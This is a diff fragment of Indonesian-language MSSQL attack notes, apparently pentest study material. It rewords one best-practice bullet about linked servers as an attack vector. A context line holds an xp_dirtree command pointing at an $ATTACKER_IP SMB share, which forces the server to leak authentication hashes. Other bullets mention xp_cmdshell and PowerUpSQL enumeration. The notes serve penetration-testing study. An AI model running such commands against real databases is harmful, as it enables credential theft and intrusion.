@@ -55,7 +55,7 @@ EXEC master..xp_dirtree '\\$ATTACKER_IP\share\'
 
 ## Best Practices
 
-- Linked servers adalah salah satu vector paling powerfull di exam
+- Linked servers adalah salah satu vektor paling kuat pada lingkungan enterprise
 - Selalu cek linked servers setelah dapat SQL access
 - PowerUpSQL adalah tool wajib untuk MSSQL enumeration
 - Jangan lupa cek xp_cmdshell status setelah enable
